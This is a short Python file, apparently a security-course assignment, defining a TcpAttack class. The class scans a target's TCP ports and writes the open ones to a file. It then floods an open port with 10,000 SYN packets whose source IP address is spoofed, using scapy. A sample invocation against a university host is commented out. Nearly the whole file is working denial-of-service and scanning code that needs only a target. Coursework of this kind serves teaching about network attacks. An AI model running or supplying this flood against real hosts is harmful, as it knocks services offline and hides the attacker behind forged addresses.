__author__ = 'Vikram'

from BitVector import *

from scapy.all import *
import socket

class TcpAttack():
    def __init__(self, spoofIP, targetIP):
        self.spoofIp = spoofIP
        self.targetIP = targetIP
        self.NUM_PACKETS = 10000
    def isOpen(self, port):
        """
        Check if port is open (BOOLEAN)
        """
        sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
        sock.settimeout(0.2)
        try:
            sock.connect( (self.targetIP, port) )
            return True
        except:
            return False # Closed port
    def scanTarget(self, rangeStart, rangeEnd):
        """
        Check if ports within rangeStart to rangeEnd are open
        """
        open_ports = []
        for testport in range(rangeStart, rangeEnd+1):
            if(self.isOpen(testport)):
                open_ports.append(testport)
        # Write ports to file
        with open("openports.txt", 'w') as OUT:
            for op in open_ports:
                    OUT.write("%s\n" % op)
    def attackTarget(self, port):
        if not (self.isOpen(port)):return 0
        for i in range(self.NUM_PACKETS):
            IP_header = IP(src = self.spoofIp, dst = self.targetIP)
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
            packet = IP_header / TCP_header
            try:
               send(packet)
            except:
               pass
        return 1

if __name__ == "__main__":
    pass
    #Tcp = TcpAttack("123.123.123.123", "shay.ecn.purdue.edu")
    #Tcp.scanTarget(0,30)
